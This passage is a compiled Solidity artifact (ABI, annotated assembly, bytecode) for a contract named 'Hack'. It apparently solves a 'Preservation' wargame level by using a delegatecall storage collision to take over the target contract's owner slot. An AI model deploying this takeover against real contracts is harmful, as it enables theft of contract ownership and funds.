{
	"contracts/Hack16.sol": {
		"Hack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "contract IPreservation",
							"name": "target",
							"type": "address"
						}
					],
					"name": "attack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "owner",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "uint256",
							"name": "_owner",
							"type": "uint256"
						}
					],
					"name": "setTime",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "timeZone1Library",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "timeZone2Library",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/Hack16.sol\":193:930  contract Hack {\r... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Hack16.sol\":193:930  contract Hack {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x27d6974f\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x3beb26c4\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x3dc79422\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_6\n      jumpi\n      dup1\n      0xd018db3e\n      eq\n      tag_7\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/Hack16.sol\":302:333  address public timeZone2Library */\n    tag_3:\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      mload(0x40)\n      tag_10\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_10:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Hack16.sol\":836:927  function setTime(uint256 _owner) public {\r... */\n    tag_4:\n      tag_12\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_13\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n      tag_15\n      jump\t// in\n    tag_12:\n      stop\n        /* \"contracts/Hack16.sol\":264:295  address public timeZone1Library */\n    tag_5:\n      tag_16\n      tag_17\n      jump\t// in\n    tag_16:\n      mload(0x40)\n      tag_18\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_18:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Hack16.sol\":340:360  address public owner */\n    tag_6:\n      tag_19\n      tag_20\n      jump\t// in\n    tag_19:\n      mload(0x40)\n      tag_21\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_21:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Hack16.sol\":369:828  function attack(IPreservation target) external {\r... */\n    tag_7:\n      tag_22\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_23\n      swap2\n      swap1\n      tag_24\n      jump\t// in\n    tag_23:\n      tag_25\n      jump\t// in\n    tag_22:\n      stop\n        /* \"contracts/Hack16.sol\":302:333  address public timeZone2Library */\n    tag_9:\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/Hack16.sol\":836:927  function setTime(uint256 _owner) public {\r... */\n    tag_15:\n        /* \"contracts/Hack16.sol\":911:917  _owner */\n      dup1\n        /* \"contracts/Hack16.sol\":887:892  owner */\n      0x02\n      0x00\n        /* \"contracts/Hack16.sol\":887:919  owner = address(uint160(_owner)) */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"contracts/Hack16.sol\":836:927  function setTime(uint256 _owner) public {\r... */\n      pop\n      jump\t// out\n        /* \"contracts/Hack16.sol\":264:295  address public timeZone1Library */\n    tag_17:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/Hack16.sol\":340:360  address public owner */\n    tag_20:\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/Hack16.sol\":369:828  function attack(IPreservation target) external {\r... */\n    tag_25:\n        /* \"contracts/Hack16.sol\":468:474  target */\n      dup1\n        /* \"contracts/Hack16.sol\":468:487  target.setFirstTime */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xf1e02620\n        /* \"contracts/Hack16.sol\":512:516  this */\n      address\n        /* \"contracts/Hack16.sol\":488:519  uint256(uint160(address(this))) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Hack16.sol\":468:520  target.setFirstTime(uint256(uint160(address(this)))) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_28\n      swap2\n      swap1\n      tag_29\n      jump\t// in\n    tag_28:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_30\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_30:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_32\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_32:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Hack16.sol\":708:714  target */\n      dup1\n        /* \"contracts/Hack16.sol\":708:727  target.setFirstTime */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xf1e02620\n        /* \"contracts/Hack16.sol\":744:754  msg.sender */\n      caller\n        /* \"contracts/Hack16.sol\":728:756  uint256(uint160(msg.sender)) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Hack16.sol\":708:757  target.setFirstTime(uint256(uint160(msg.sender))) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_33\n      swap2\n      swap1\n      tag_29\n      jump\t// in\n    tag_33:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_34\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_34:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_36\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_36:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Hack16.sol\":794:804  msg.sender */\n      caller\n        /* \"contracts/Hack16.sol\":776:804  target.owner() == msg.sender */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/Hack16.sol\":776:782  target */\n      dup2\n        /* \"contracts/Hack16.sol\":776:788  target.owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x8da5cb5b\n        /* \"contracts/Hack16.sol\":776:790  target.owner() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_37\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_37:\n      pop\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_39\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_39:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_40\n      swap2\n      swap1\n      tag_41\n      jump\t// in\n    tag_40:\n        /* \"contracts/Hack16.sol\":776:804  target.owner() == msg.sender */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"contracts/Hack16.sol\":768:820  require(target.owner() == msg.sender, \"hack failed\") */\n      tag_42\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_43\n      swap1\n      tag_44\n      jump\t// in\n    tag_43:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_42:\n        /* \"contracts/Hack16.sol\":369:828  function attack(IPreservation target) external {\r... */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7:150   */\n    tag_46:\n      0x00\n        /* \"#utility.yul\":95:101   */\n      dup2\n        /* \"#utility.yul\":89:102   */\n      mload\n        /* \"#utility.yul\":80:102   */\n      swap1\n      pop\n        /* \"#utility.yul\":111:144   */\n      tag_48\n        /* \"#utility.yul\":138:143   */\n      dup2\n        /* \"#utility.yul\":111:144   */\n      tag_49\n      jump\t// in\n    tag_48:\n        /* \"#utility.yul\":70:150   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":156:335   */\n    tag_50:\n      0x00\n        /* \"#utility.yul\":260:266   */\n      dup2\n        /* \"#utility.yul\":247:267   */\n      calldataload\n        /* \"#utility.yul\":238:267   */\n      swap1\n      pop\n        /* \"#utility.yul\":276:329   */\n      tag_52\n        /* \"#utility.yul\":323:328   */\n      dup2\n        /* \"#utility.yul\":276:329   */\n      tag_53\n      jump\t// in\n    tag_52:\n        /* \"#utility.yul\":228:335   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":341:480   */\n    tag_54:\n      0x00\n        /* \"#utility.yul\":425:431   */\n      dup2\n        /* \"#utility.yul\":412:432   */\n      calldataload\n        /* \"#utility.yul\":403:432   */\n      swap1\n      pop\n        /* \"#utility.yul\":441:474   */\n      tag_56\n        /* \"#utility.yul\":468:473   */\n      dup2\n        /* \"#utility.yul\":441:474   */\n      tag_57\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":393:480   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":486:770   */\n    tag_41:\n      0x00\n        /* \"#utility.yul\":605:607   */\n      0x20\n        /* \"#utility.yul\":593:602   */\n      dup3\n        /* \"#utility.yul\":584:591   */\n      dup5\n        /* \"#utility.yul\":580:603   */\n      sub\n        /* \"#utility.yul\":576:608   */\n      slt\n        /* \"#utility.yul\":573:575   */\n      iszero\n      tag_59\n      jumpi\n        /* \"#utility.yul\":621:622   */\n      0x00\n        /* \"#utility.yul\":618:619   */\n      dup1\n        /* \"#utility.yul\":611:623   */\n      revert\n        /* \"#utility.yul\":573:575   */\n    tag_59:\n        /* \"#utility.yul\":664:665   */\n      0x00\n        /* \"#utility.yul\":689:753   */\n      tag_60\n        /* \"#utility.yul\":745:752   */\n      dup5\n        /* \"#utility.yul\":736:742   */\n      dup3\n        /* \"#utility.yul\":725:734   */\n      dup6\n        /* \"#utility.yul\":721:743   */\n      add\n        /* \"#utility.yul\":689:753   */\n      tag_46\n      jump\t// in\n    tag_60:\n        /* \"#utility.yul\":679:753   */\n      swap2\n      pop\n        /* \"#utility.yul\":635:763   */\n      pop\n        /* \"#utility.yul\":563:770   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":776:1078   */\n    tag_24:\n      0x00\n        /* \"#utility.yul\":904:906   */\n      0x20\n        /* \"#utility.yul\":892:901   */\n      dup3\n        /* \"#utility.yul\":883:890   */\n      dup5\n        /* \"#utility.yul\":879:902   */\n      sub\n        /* \"#utility.yul\":875:907   */\n      slt\n        /* \"#utility.yul\":872:874   */\n      iszero\n      tag_62\n      jumpi\n        /* \"#utility.yul\":920:921   */\n      0x00\n        /* \"#utility.yul\":917:918   */\n      dup1\n        /* \"#utility.yul\":910:922   */\n      revert\n        /* \"#utility.yul\":872:874   */\n    tag_62:\n        /* \"#utility.yul\":963:964   */\n      0x00\n        /* \"#utility.yul\":988:1061   */\n      tag_63\n        /* \"#utility.yul\":1053:1060   */\n      dup5\n        /* \"#utility.yul\":1044:1050   */\n      dup3\n        /* \"#utility.yul\":1033:1042   */\n      dup6\n        /* \"#utility.yul\":1029:1051   */\n      add\n        /* \"#utility.yul\":988:1061   */\n      tag_50\n      jump\t// in\n    tag_63:\n        /* \"#utility.yul\":978:1061   */\n      swap2\n      pop\n        /* \"#utility.yul\":934:1071   */\n      pop\n        /* \"#utility.yul\":862:1078   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1084:1346   */\n    tag_14:\n      0x00\n        /* \"#utility.yul\":1192:1194   */\n      0x20\n        /* \"#utility.yul\":1180:1189   */\n      dup3\n        /* \"#utility.yul\":1171:1178   */\n      dup5\n        /* \"#utility.yul\":1167:1190   */\n      sub\n        /* \"#utility.yul\":1163:1195   */\n      slt\n        /* \"#utility.yul\":1160:1162   */\n      iszero\n      tag_65\n      jumpi\n        /* \"#utility.yul\":1208:1209   */\n      0x00\n        /* \"#utility.yul\":1205:1206   */\n      dup1\n        /* \"#utility.yul\":1198:1210   */\n      revert\n        /* \"#utility.yul\":1160:1162   */\n    tag_65:\n        /* \"#utility.yul\":1251:1252   */\n      0x00\n        /* \"#utility.yul\":1276:1329   */\n      tag_66\n        /* \"#utility.yul\":1321:1328   */\n      dup5\n        /* \"#utility.yul\":1312:1318   */\n      dup3\n        /* \"#utility.yul\":1301:1310   */\n      dup6\n        /* \"#utility.yul\":1297:1319   */\n      add\n        /* \"#utility.yul\":1276:1329   */\n      tag_54\n      jump\t// in\n    tag_66:\n        /* \"#utility.yul\":1266:1329   */\n      swap2\n      pop\n        /* \"#utility.yul\":1222:1339   */\n      pop\n        /* \"#utility.yul\":1150:1346   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1352:1470   */\n    tag_67:\n        /* \"#utility.yul\":1439:1463   */\n      tag_69\n        /* \"#utility.yul\":1457:1462   */\n      dup2\n        /* \"#utility.yul\":1439:1463   */\n      tag_70\n      jump\t// in\n    tag_69:\n        /* \"#utility.yul\":1434:1437   */\n      dup3\n        /* \"#utility.yul\":1427:1464   */\n      mstore\n        /* \"#utility.yul\":1417:1470   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1476:1785   */\n    tag_71:\n      0x00\n        /* \"#utility.yul\":1639:1706   */\n      tag_73\n        /* \"#utility.yul\":1703:1705   */\n      0x0b\n        /* \"#utility.yul\":1698:1701   */\n      dup4\n        /* \"#utility.yul\":1639:1706   */\n      tag_74\n      jump\t// in\n    tag_73:\n        /* \"#utility.yul\":1632:1706   */\n      swap2\n      pop\n        /* \"#utility.yul\":1736:1749   */\n      0x6861636b206661696c6564000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1732:1733   */\n      0x00\n        /* \"#utility.yul\":1727:1730   */\n      dup4\n        /* \"#utility.yul\":1723:1734   */\n      add\n        /* \"#utility.yul\":1716:1750   */\n      mstore\n        /* \"#utility.yul\":1776:1778   */\n      0x20\n        /* \"#utility.yul\":1771:1774   */\n      dup3\n        /* \"#utility.yul\":1767:1779   */\n      add\n        /* \"#utility.yul\":1760:1779   */\n      swap1\n      pop\n        /* \"#utility.yul\":1622:1785   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1791:1909   */\n    tag_75:\n        /* \"#utility.yul\":1878:1902   */\n      tag_77\n        /* \"#utility.yul\":1896:1901   */\n      dup2\n        /* \"#utility.yul\":1878:1902   */\n      tag_78\n      jump\t// in\n    tag_77:\n        /* \"#utility.yul\":1873:1876   */\n      dup3\n        /* \"#utility.yul\":1866:1903   */\n      mstore\n        /* \"#utility.yul\":1856:1909   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1915:2137   */\n    tag_11:\n      0x00\n        /* \"#utility.yul\":2046:2048   */\n      0x20\n        /* \"#utility.yul\":2035:2044   */\n      dup3\n        /* \"#utility.yul\":2031:2049   */\n      add\n        /* \"#utility.yul\":2023:2049   */\n      swap1\n      pop\n        /* \"#utility.yul\":2059:2130   */\n      tag_80\n        /* \"#utility.yul\":2127:2128   */\n      0x00\n        /* \"#utility.yul\":2116:2125   */\n      dup4\n        /* \"#utility.yul\":2112:2129   */\n      add\n        /* \"#utility.yul\":2103:2109   */\n      dup5\n        /* \"#utility.yul\":2059:2130   */\n      tag_67\n      jump\t// in\n    tag_80:\n        /* \"#utility.yul\":2013:2137   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2143:2562   */\n    tag_44:\n      0x00\n        /* \"#utility.yul\":2347:2349   */\n      0x20\n        /* \"#utility.yul\":2336:2345   */\n      dup3\n        /* \"#utility.yul\":2332:2350   */\n      add\n        /* \"#utility.yul\":2324:2350   */\n      swap1\n      pop\n        /* \"#utility.yul\":2396:2405   */\n      dup2\n        /* \"#utility.yul\":2390:2394   */\n      dup2\n        /* \"#utility.yul\":2386:2406   */\n      sub\n        /* \"#utility.yul\":2382:2383   */\n      0x00\n        /* \"#utility.yul\":2371:2380   */\n      dup4\n        /* \"#utility.yul\":2367:2384   */\n      add\n        /* \"#utility.yul\":2360:2407   */\n      mstore\n        /* \"#utility.yul\":2424:2555   */\n      tag_82\n        /* \"#utility.yul\":2550:2554   */\n      dup2\n        /* \"#utility.yul\":2424:2555   */\n      tag_71\n      jump\t// in\n    tag_82:\n        /* \"#utility.yul\":2416:2555   */\n      swap1\n      pop\n        /* \"#utility.yul\":2314:2562   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2568:2790   */\n    tag_29:\n      0x00\n        /* \"#utility.yul\":2699:2701   */\n      0x20\n        /* \"#utility.yul\":2688:2697   */\n      dup3\n        /* \"#utility.yul\":2684:2702   */\n      add\n        /* \"#utility.yul\":2676:2702   */\n      swap1\n      pop\n        /* \"#utility.yul\":2712:2783   */\n      tag_84\n        /* \"#utility.yul\":2780:2781   */\n      0x00\n        /* \"#utility.yul\":2769:2778   */\n      dup4\n        /* \"#utility.yul\":2765:2782   */\n      add\n        /* \"#utility.yul\":2756:2762   */\n      dup5\n        /* \"#utility.yul\":2712:2783   */\n      tag_75\n      jump\t// in\n    tag_84:\n        /* \"#utility.yul\":2666:2790   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2796:2965   */\n    tag_74:\n      0x00\n        /* \"#utility.yul\":2914:2920   */\n      dup3\n        /* \"#utility.yul\":2909:2912   */\n      dup3\n        /* \"#utility.yul\":2902:2921   */\n      mstore\n        /* \"#utility.yul\":2954:2958   */\n      0x20\n        /* \"#utility.yul\":2949:2952   */\n      dup3\n        /* \"#utility.yul\":2945:2959   */\n      add\n        /* \"#utility.yul\":2930:2959   */\n      swap1\n      pop\n        /* \"#utility.yul\":2892:2965   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2971:3067   */\n    tag_70:\n      0x00\n        /* \"#utility.yul\":3037:3061   */\n      tag_87\n        /* \"#utility.yul\":3055:3060   */\n      dup3\n        /* \"#utility.yul\":3037:3061   */\n      tag_88\n      jump\t// in\n    tag_87:\n        /* \"#utility.yul\":3026:3061   */\n      swap1\n      pop\n        /* \"#utility.yul\":3016:3067   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3073:3189   */\n    tag_89:\n      0x00\n        /* \"#utility.yul\":3159:3183   */\n      tag_91\n        /* \"#utility.yul\":3177:3182   */\n      dup3\n        /* \"#utility.yul\":3159:3183   */\n      tag_70\n      jump\t// in\n    tag_91:\n        /* \"#utility.yul\":3148:3183   */\n      swap1\n      pop\n        /* \"#utility.yul\":3138:3189   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3195:3321   */\n    tag_88:\n      0x00\n        /* \"#utility.yul\":3272:3314   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":3265:3270   */\n      dup3\n        /* \"#utility.yul\":3261:3315   */\n      and\n        /* \"#utility.yul\":3250:3315   */\n      swap1\n      pop\n        /* \"#utility.yul\":3240:3321   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3327:3404   */\n    tag_78:\n      0x00\n        /* \"#utility.yul\":3393:3398   */\n      dup2\n        /* \"#utility.yul\":3382:3398   */\n      swap1\n      pop\n        /* \"#utility.yul\":3372:3404   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3410:3532   */\n    tag_49:\n        /* \"#utility.yul\":3483:3507   */\n      tag_95\n        /* \"#utility.yul\":3501:3506   */\n      dup2\n        /* \"#utility.yul\":3483:3507   */\n      tag_70\n      jump\t// in\n    tag_95:\n        /* \"#utility.yul\":3476:3481   */\n      dup2\n        /* \"#utility.yul\":3473:3508   */\n      eq\n        /* \"#utility.yul\":3463:3465   */\n      tag_96\n      jumpi\n        /* \"#utility.yul\":3522:3523   */\n      0x00\n        /* \"#utility.yul\":3519:3520   */\n      dup1\n        /* \"#utility.yul\":3512:3524   */\n      revert\n        /* \"#utility.yul\":3463:3465   */\n    tag_96:\n        /* \"#utility.yul\":3453:3532   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3538:3700   */\n    tag_53:\n        /* \"#utility.yul\":3631:3675   */\n      tag_98\n        /* \"#utility.yul\":3669:3674   */\n      dup2\n        /* \"#utility.yul\":3631:3675   */\n      tag_89\n      jump\t// in\n    tag_98:\n        /* \"#utility.yul\":3624:3629   */\n      dup2\n        /* \"#utility.yul\":3621:3676   */\n      eq\n        /* \"#utility.yul\":3611:3613   */\n      tag_99\n      jumpi\n        /* \"#utility.yul\":3690:3691   */\n      0x00\n        /* \"#utility.yul\":3687:3688   */\n      dup1\n        /* \"#utility.yul\":3680:3692   */\n      revert\n        /* \"#utility.yul\":3611:3613   */\n    tag_99:\n        /* \"#utility.yul\":3601:3700   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3706:3828   */\n    tag_57:\n        /* \"#utility.yul\":3779:3803   */\n      tag_101\n        /* \"#utility.yul\":3797:3802   */\n      dup2\n        /* \"#utility.yul\":3779:3803   */\n      tag_78\n      jump\t// in\n    tag_101:\n        /* \"#utility.yul\":3772:3777   */\n      dup2\n        /* \"#utility.yul\":3769:3804   */\n      eq\n        /* \"#utility.yul\":3759:3761   */\n      tag_102\n      jumpi\n        /* \"#utility.yul\":3818:3819   */\n      0x00\n        /* \"#utility.yul\":3815:3816   */\n      dup1\n        /* \"#utility.yul\":3808:3820   */\n      revert\n        /* \"#utility.yul\":3759:3761   */\n    tag_102:\n        /* \"#utility.yul\":3749:3828   */\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220a76a89336e5d71f2e9e7c33faea0eea803751fb8fbba2918d91b4edcc85e82cc64736f6c63430008000033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b506105da806100206000396000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c806327d6974f1461005c5780633beb26c41461007a5780633dc79422146100965780638da5cb5b146100b4578063d018db3e146100d2575b600080fd5b6100646100ee565b60405161007191906104aa565b60405180910390f35b610094600480360381019061008f9190610423565b610114565b005b61009e610158565b6040516100ab91906104aa565b60405180910390f35b6100bc61017c565b6040516100c991906104aa565b60405180910390f35b6100ec60048036038101906100e791906103fa565b6101a2565b005b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b80600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b8073ffffffffffffffffffffffffffffffffffffffff1663f1e026203073ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b81526004016101f191906104e5565b600060405180830381600087803b15801561020b57600080fd5b505af115801561021f573d6000803e3d6000fd5b505050508073ffffffffffffffffffffffffffffffffffffffff1663f1e026203373ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b815260040161027291906104e5565b600060405180830381600087803b15801561028c57600080fd5b505af11580156102a0573d6000803e3d6000fd5b505050503373ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16638da5cb5b6040518163ffffffff1660e01b815260040160206040518083038186803b15801561030157600080fd5b505afa158015610315573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061033991906103d1565b73ffffffffffffffffffffffffffffffffffffffff161461038f576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610386906104c5565b60405180910390fd5b50565b6000815190506103a18161055f565b92915050565b6000813590506103b681610576565b92915050565b6000813590506103cb8161058d565b92915050565b6000602082840312156103e357600080fd5b60006103f184828501610392565b91505092915050565b60006020828403121561040c57600080fd5b600061041a848285016103a7565b91505092915050565b60006020828403121561043557600080fd5b6000610443848285016103bc565b91505092915050565b61045581610511565b82525050565b6000610468600b83610500565b91507f6861636b206661696c65640000000000000000000000000000000000000000006000830152602082019050919050565b6104a481610555565b82525050565b60006020820190506104bf600083018461044c565b92915050565b600060208201905081810360008301526104de8161045b565b9050919050565b60006020820190506104fa600083018461049b565b92915050565b600082825260208201905092915050565b600061051c82610535565b9050919050565b600061052e82610511565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b61056881610511565b811461057357600080fd5b50565b61057f81610523565b811461058a57600080fd5b50565b61059681610555565b81146105a157600080fd5b5056fea2646970667358221220a76a89336e5d71f2e9e7c33faea0eea803751fb8fbba2918d91b4edcc85e82cc64736f6c63430008000033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x5DA DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x57 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x27D6974F EQ PUSH2 0x5C JUMPI DUP1 PUSH4 0x3BEB26C4 EQ PUSH2 0x7A JUMPI DUP1 PUSH4 0x3DC79422 EQ PUSH2 0x96 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0xB4 JUMPI DUP1 PUSH4 0xD018DB3E EQ PUSH2 0xD2 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x64 PUSH2 0xEE JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x71 SWAP2 SWAP1 PUSH2 0x4AA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x94 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x8F SWAP2 SWAP1 PUSH2 0x423 JUMP JUMPDEST PUSH2 0x114 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x9E PUSH2 0x158 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xAB SWAP2 SWAP1 PUSH2 0x4AA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xBC PUSH2 0x17C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xC9 SWAP2 SWAP1 PUSH2 0x4AA JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xEC PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0xE7 SWAP2 SWAP1 PUSH2 0x3FA JUMP JUMPDEST PUSH2 0x1A2 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST DUP1 PUSH1 0x2 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 